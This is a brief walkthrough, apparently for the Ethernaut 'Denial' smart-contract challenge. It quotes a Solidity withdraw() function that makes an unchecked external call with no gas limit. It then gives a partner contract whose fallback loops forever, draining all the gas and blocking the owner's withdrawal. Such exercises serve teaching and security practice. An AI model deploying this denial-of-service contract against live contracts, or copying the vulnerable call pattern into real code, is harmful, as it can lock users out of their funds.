Our Goal : If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

Withdraw function looks as below:

```solidity
    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint256 amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }
```

To deny the user from withdrawing we may use a partner contract which can deny the withdraw using an infinite loop which will consume all the gas and the `partner.call()` will fail causing the withdraw to revert.

Deploy below contract and set it as the partner using `setWithdrawPartner()` function.

```solidity
    contract Partner {
        fallback() external payable {
            while (true) {}
        }
    }
```
